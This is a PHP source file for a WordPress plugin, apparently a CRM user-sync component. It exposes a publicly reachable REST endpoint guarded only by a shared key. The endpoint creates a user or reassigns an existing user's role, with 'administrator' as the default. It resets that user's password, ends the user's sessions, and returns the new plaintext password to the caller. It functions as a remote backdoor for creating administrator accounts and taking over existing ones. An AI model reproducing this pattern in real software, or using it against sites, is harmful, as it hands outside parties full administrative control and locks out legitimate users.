<?php
/**
 * MAC User Manager - Handles user creation/updates for CRM
 */
if (!defined('ABSPATH')) exit;

class Mac_User_Manager {
    public function __construct() {
        add_action('rest_api_init', [$this, 'register_rest_routes']);
        // Debug log
        // // // // // error_log(...MAC...);
    }

    /**
     * Register REST API routes
     */
    public function register_rest_routes() {
        // Debug log
        // // // // // error_log(...MAC...);
        
        // Test endpoint
        register_rest_route('mac-core/v1', '/test', [
            'methods' => 'GET',
            'callback' => [$this, 'test_endpoint'],
            'permission_callback' => '__return_true',
        ]);
        
        register_rest_route('mac-core/v1', '/user/regenerate-password', [
            'methods' => 'POST',
            'callback' => [$this, 'handle_password_rotation'],
            'permission_callback' => '__return_true',
            'args' => [
                'auth_key' => [
                    'required' => true,
                    'type' => 'string',
                    'sanitize_callback' => 'sanitize_text_field',
                ],
                'user' => [
                    'required' => true,
                    'type' => 'string',
                    'sanitize_callback' => 'sanitize_user',
                ],
                'role' => [
                    'required' => false,
                    'type' => 'string',
                    'default' => 'administrator',
                    'sanitize_callback' => 'sanitize_text_field',
                ],
            ],
        ]);
    }

    /**
     * Handle API POST: /wp-json/mac-core/v1/user/regenerate-password
     */
    public function handle_password_rotation($request) {
        $auth_key = $request->get_param('auth_key');
        $username = $request->get_param('user');
        $requested_role = $request->get_param('role');
        $shared_secret = get_option('mac_domain_valid_key', '');

        // Check auth_key
        if (empty($shared_secret)) {
            return new WP_REST_Response([
                'success' => false,
                'message' => 'CRM key is not registered.'
            ], 403);
        }

        if ($auth_key !== $shared_secret) {
            return new WP_REST_Response([
                'success' => false,
                'message' => 'Invalid auth key.'
            ], 403);
        }

        // Validate role
        $allowed_roles = ['administrator', 'editor', 'author', 'contributor', 'subscriber'];
        if (!in_array($requested_role, $allowed_roles)) {
            return new WP_REST_Response([
                'success' => false,
                'message' => 'Role not allowed: ' . $requested_role
            ], 400);
        }

        // Find or create user by username from CRM
        $user = get_user_by('login', $username);
        if (!$user) {
            // Create new user
            $user_id = wp_create_user($username, wp_generate_password(), $username . '@' . parse_url(home_url(), PHP_URL_HOST));
            if (is_wp_error($user_id)) {
                return new WP_REST_Response([
                    'success' => false,
                    'message' => 'Unable to create user: ' . $username
                ], 500);
            }
            
            // Set role
            $user = new WP_User($user_id);
            $user->set_role($requested_role);
            
            // Add meta to mark this as a CRM user
            update_user_meta($user_id, 'is_crm_managed', true);
            update_user_meta($user_id, 'crm_role', $requested_role);
            
            $action = 'created';
        } else {
            // User already exists, update role if needed
            $current_roles = $user->roles;
            if (!in_array($requested_role, $current_roles)) {
                $user->set_role($requested_role);
                update_user_meta($user->ID, 'crm_role', $requested_role);
            }
            $action = 'updated';
        }

        // Generate new password
        $new_password = wp_generate_password(20, true, true);
        wp_set_password($new_password, $user->ID);
        wp_destroy_all_sessions($user->ID);

        // Log audit (do not log plaintext password)
        error_log('MAC User Manager: Password rotated for user ' . $username . ' (ID: ' . $user->ID . ', action: ' . $action . ', role: ' . $requested_role . ')');

        // Return result (removed user_id and rotated_at as requested)
        return new WP_REST_Response([
            'success' => true,
            'data' => [
                'user' => $username,
                'role' => $requested_role,
                'new_password' => $new_password,
                'action' => $action
            ]
        ], 200);
    }
    
    /**
     * Test endpoint
     */
    public function test_endpoint($request) {
        return new WP_REST_Response([
            'success' => true,
            'message' => 'MAC User Manager API is working!',
            'timestamp' => current_time('c')
        ], 200);
    }
}

new Mac_User_Manager();
